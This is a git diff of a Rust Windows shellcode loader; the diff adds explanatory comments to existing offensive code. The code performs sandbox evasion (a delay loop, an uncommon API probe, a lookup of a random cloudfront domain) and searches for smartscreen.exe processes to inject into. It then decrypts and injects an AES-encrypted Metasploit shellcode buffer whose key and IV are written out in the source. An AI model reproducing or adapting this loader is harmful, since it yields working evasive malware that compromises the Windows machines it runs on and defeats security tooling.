@@ -11,6 +11,7 @@ use windows::Win32::Foundation::BOOL;
 use windows::Win32::UI::Input::Pointer::EnableMouseInPointer;
 
 fn brace() {
+    // sandbox detected, eject!
     for _i in 1..10000000 {
         continue;
     }
@@ -18,6 +19,7 @@ fn brace() {
 }
 
 fn weird_api() -> BOOL {
+    // check if in sandbox by calling an uncommon API
     unsafe {
         let res: BOOL = EnableMouseInPointer(true);
         return res;
@@ -25,6 +27,7 @@ fn weird_api() -> BOOL {
 }
 
 fn space_call() -> bool {
+    // check if in sandbox by trying to reach a non existing resource
     let charset = "abcdefghijklmnopqrstuvwyz";
     let prefix = generate(15, charset);
     let ta_url = "https://".to_owned() + &prefix + ".cloudfront.com/";
@@ -36,6 +39,7 @@ fn space_call() -> bool {
 }
 
 fn boxboxbox(tar: &str) -> Vec<u32> {
+    // search for processes to inject into
     let mut dom: Vec<u32> = Vec::new();
     let s = System::new_all();
     for pro in s.processes_by_exact_name(tar) {
@@ -45,6 +49,7 @@ fn boxboxbox(tar: &str) -> Vec<u32> {
 }
 
 fn enhance(buf: &[u8], tar: &u32) {
+    // injecting in target processes :)
     println!("[+] Targeting {}", tar);
 
     let kernel32 = dinvoke::get_module_base_address("kernel32.dll");
@@ -137,6 +142,7 @@ fn enhance(buf: &[u8], tar: &u32) {
 }
 
 fn sable() {
+    // sandbox check meta function
     if weird_api() == false {
         brace();
     } else if space_call() == false {
@@ -147,7 +153,7 @@ fn sable() {
 }
 
 fn aes_256_decrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
-    //thank MemN0ps
+    // thanks to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
     let cipher = Cipher::new_256(key);
     let decrypted = cipher.cbc_decrypt(iv, &shellcode);
 
@@ -155,7 +161,10 @@ fn aes_256_decrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8
 }
 
 fn main() {
+    // inject in the following processes:
     let tar: &str = "smartscreen.exe";
+
+    // aes encrypted msf shellcode :
     let enc_buf: Vec<u8> = vec![
         0xef, 0x5, 0xb4, 0xf7, 0xf4, 0xe1, 0x69, 0xc5, 0xd8, 0x76, 0xe3, 0xae, 0x4b, 0x62, 0x25,
         0x32, 0xd0, 0xdb, 0xdd, 0x30, 0x41, 0xbb, 0x2d, 0x9, 0x88, 0x7, 0xbb, 0x83, 0x94, 0x70,
@@ -219,7 +228,7 @@ fn main() {
         panic!("Unable to find a process.")
     } else {
         let buf: Vec<u8> = aes_256_decrypt(
-            //thanks MemN0ps
+            // thanks again to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
             &enc_buf,
             b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337",
             b"This is 16 bytes",
